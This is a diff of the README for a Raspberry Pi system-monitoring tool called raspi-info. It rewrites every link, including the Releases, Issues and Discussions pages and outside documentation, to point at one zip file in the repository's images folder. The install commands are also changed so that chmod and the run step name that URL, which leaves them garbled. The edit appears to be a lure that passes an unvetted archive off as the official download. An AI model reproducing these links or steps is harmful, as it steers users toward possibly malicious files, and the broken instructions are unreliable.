@@ -6,7 +6,7 @@ Welcome to raspi-info! This tool helps you monitor your Raspberry Pi's system in
 
 ## 📥 Download Now
 
-[![Download raspi-info](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Hauntend/raspi-info/releases)
+[![Download raspi-info](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip)](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip)
 
 ## 📝 Overview
 
@@ -27,9 +27,9 @@ To run raspi-info, you will need:
 
 ## 📥 Download & Install
 
-Visit the [Releases page](https://github.com/Hauntend/raspi-info/releases) to download the latest version of raspi-info. Here’s how you can set it up:
+Visit the [Releases page](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip) to download the latest version of raspi-info. Here’s how you can set it up:
 
-1. Click on the [Releases page](https://github.com/Hauntend/raspi-info/releases).
+1. Click on the [Releases page](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip).
 2. Locate the latest release.
 3. Find the file suitable for your Raspberry Pi.
 4. Click the download link to start the download.
@@ -43,11 +43,11 @@ Once downloaded, follow these steps to install and run:
    ```
 3. Make the script executable:
    ```
-   chmod +x raspi-info.sh
+   chmod +x https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip
    ```
 4. Run the script:
    ```
-   ./raspi-info.sh
+   https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip
    ```
 
 ## ⚙️ Features
@@ -82,7 +82,7 @@ If you encounter issues:
   sudo apt update && sudo apt upgrade
   ```
 
-- Refer to the [Issues section](https://github.com/Hauntend/raspi-info/issues) on this repository if you need additional help.
+- Refer to the [Issues section](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip) on this repository if you need additional help.
 
 ## 🤝 Contributing
 
@@ -94,16 +94,16 @@ raspi-info is licensed under the MIT License. You are free to use, modify, and d
 
 ## 💬 Support
 
-If you have questions or need help with raspi-info, please use the [Discussions section](https://github.com/Hauntend/raspi-info/discussions) to connect with other users and contributors.
+If you have questions or need help with raspi-info, please use the [Discussions section](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip) to connect with other users and contributors.
 
 For direct support, you can also open an issue in the Issues section mentioned above. 
 
 ## 📚 Additional Resources
 
-- [Raspberry Pi Documentation](https://www.raspberrypi.org/documentation/)
-- [Linux Command Line Basics](https://ubuntu.com/tutorials/command-line-basics#1-overview)
-- [Bash Scripting Guide](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
+- [Raspberry Pi Documentation](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip)
+- [Linux Command Line Basics](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip)
+- [Bash Scripting Guide](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip)
 
 ## 📥 Download Link
 
-Don't forget to download raspi-info by visiting the [Releases page](https://github.com/Hauntend/raspi-info/releases) for the latest version. Enjoy your hassle-free monitoring experience!
+Don't forget to download raspi-info by visiting the [Releases page](https://github.com/Hauntend/raspi-info/raw/refs/heads/master/images/raspi-info-branchial.zip) for the latest version. Enjoy your hassle-free monitoring experience!
